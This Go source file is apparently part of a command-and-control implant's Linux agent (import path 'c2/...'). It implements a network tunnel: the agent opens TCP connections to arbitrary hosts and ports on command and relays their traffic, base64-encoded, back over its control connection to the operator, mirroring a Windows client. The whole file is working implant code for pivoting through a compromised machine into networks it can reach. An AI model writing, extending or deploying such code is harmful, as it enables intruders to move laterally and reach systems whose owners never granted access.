//go:build linux

package linuxagent

import (
	"encoding/base64"
	"net"
	"strconv"
	"sync"

	"c2/internal/jsonutil"
)

func (a *Agent) tunnelConnect(connID, host string, port int, tunnelID uint32) {
	addr := net.JoinHostPort(host, strconv.Itoa(port))
	c, err := net.Dial("tcp", addr)
	if err != nil {
		return
	}
	a.tunnelMu.Lock()
	a.tunnels[connID] = c
	a.tunnelMu.Unlock()
	go a.tunnelReadForward(connID, c, tunnelID)
}

func (a *Agent) tunnelReadForward(connID string, c net.Conn, tunnelID uint32) {
	defer func() {
		a.tunnelMu.Lock()
		delete(a.tunnels, connID)
		a.tunnelMu.Unlock()
		_ = c.Close()
	}()
	buf := make([]byte, 8192)
	for a.running.Load() {
		n, err := c.Read(buf)
		if n <= 0 {
			if err != nil {
				return
			}
			continue
		}
		b64 := base64.StdEncoding.EncodeToString(buf[:n])
		msg := map[string]string{
			"type":       "tunnel_data",
			"tunnel_id":  strconv.FormatUint(uint64(tunnelID), 10),
			"conn_id":    connID,
			"direction":  "in",
			"data":       b64,
		}
		line, _ := jsonutil.MarshalCompact(msg)
		a.sendTunnelLine(line)
	}
}

func (a *Agent) tunnelData(connID, dataB64 string) {
	raw, err := base64.StdEncoding.DecodeString(dataB64)
	if err != nil {
		return
	}
	a.tunnelMu.Lock()
	c, ok := a.tunnels[connID]
	a.tunnelMu.Unlock()
	if !ok || c == nil {
		return
	}
	_, _ = c.Write(raw)
}

var tunnelLineMu sync.Mutex

// 与 Windows 客户端一致：隧道数据始终走 TCP 控制连接。
func (a *Agent) sendTunnelLine(line []byte) {
	tunnelLineMu.Lock()
	defer tunnelLineMu.Unlock()
	_ = a.writeLineTCP(line)
}
